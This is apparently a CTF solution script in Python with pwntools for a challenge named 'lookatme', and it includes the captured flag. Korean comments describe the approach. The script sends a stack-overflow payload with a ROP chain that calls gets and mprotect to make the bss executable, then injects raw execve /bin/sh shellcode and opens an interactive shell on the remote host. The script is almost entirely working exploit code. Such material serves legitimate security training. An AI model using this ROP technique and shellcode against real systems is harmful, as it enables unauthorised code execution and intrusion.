# -*- coding: utf-8 -*-
from pwn import * 

#p = process("./lookatme")
p = remote("ctf.j0n9hyun.xyz",3017)


# 이런 저런거 확인해 보면, rtl은 된다. nx는 안되므로 쉘코드는 x.
# 입력부터 eip까지 28바이트, 넣으면 bbbb에서 터진다. rtl 오케이.
# 근데 execve, system 함수가 없다. 이런...
# (writeup 일부 참고.) mprotect라는 함수가 있다. 특정 메모리 영역의 권한을 바꿔주는 함수다. 
# 이 함수를 이용해 bss영역에 쉘코드를 넣고, 권한을 rwx(7)로 설정해주면 실행이 될거다. 
# 함수를 통해 권한 변조가 끝나면 다시 함수로 이동 후 , 공격 위치의 주소로 ret를 덮자. 


# 각종 주소값 준비 
shell = 0x80eb000 
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

mp = 0x806e0f0 # addr , length , op
gets = 0x804f120
ret = 0x0804887c

pr = 0x80481c9
p2r = 0x80483c9
p3r = 0x80483c8
p4r = 0x80483c7

payload = "a"*28
payload += p32(gets) + p32(pr) + p32(shell)		#input shellcode 
payload += p32(mp) + p32(p3r) + p32(shell) + p32(0x2000) + p32(7)	#mprotect
payload += p32(ret) 
pause()
p.sendline(payload)

p.sendline(shellcode)	#input shellcode

payload2 = "b"*28
payload2 += p32(shell)

p.sendline(payload2)

p.interactive()
#HackCTF{Did_you_understand_the_static_linking_method?}
